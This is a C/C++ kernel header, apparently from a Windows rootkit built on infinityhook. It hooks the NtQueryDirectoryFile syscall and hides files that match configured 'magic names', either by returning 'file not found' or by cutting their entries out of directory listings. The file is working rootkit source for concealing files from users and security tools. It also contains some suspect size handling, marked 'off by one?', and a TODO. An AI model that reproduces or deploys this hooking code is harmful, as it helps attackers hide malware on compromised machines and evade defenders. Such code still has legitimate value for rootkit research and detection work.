#pragma once
#include "Settings.h"

typedef NTSTATUS(*NtQueryDirectoryFile_t)(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING FileName,
	_In_ BOOLEAN RestartScan
);

static UNICODE_STRING StringNtQueryDirectoryFile = RTL_CONSTANT_STRING(L"NtQueryDirectoryFile");
static NtQueryDirectoryFile_t OriginalNtQueryDirectoryFile = NULL;

// NtQueryDirectoryFile Detour
NTSTATUS DetourNtQueryDirectoryFile(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING FileName,
	_In_ BOOLEAN RestartScan)
{
	//kprintf("[+] infinityhook: NtQueryDirectoryFile: %wZ, class: %d\n", FileName, FileInformationClass);

	//
	// Call the original syscall so that the buffers are populated
	//
	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	if (NT_SUCCESS(OriginalStatus)) {
		if (FileName != nullptr) {
			// check whether the user-supplied FileName query contains the filename that we want to hide, if yes, return File Not Found
			WCHAR TempBuffer[MAX_PATH_SYSHOOKER] = { 0 };
			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
				TempBuffer[i] = FileName->Buffer[i];
			}
			if (wcsstr(TempBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
				return STATUS_NO_SUCH_FILE;
			}
		}

		// if the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63] cast the buffer pointer to the appropriate structure pointer and read it
		// TODO
		if (FileInformationClass == 37) {
			PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				//kprintf("[+] infinityhook: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				//if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);

					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE - LAST ONE\n");

						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
	}
	return OriginalStatus;
}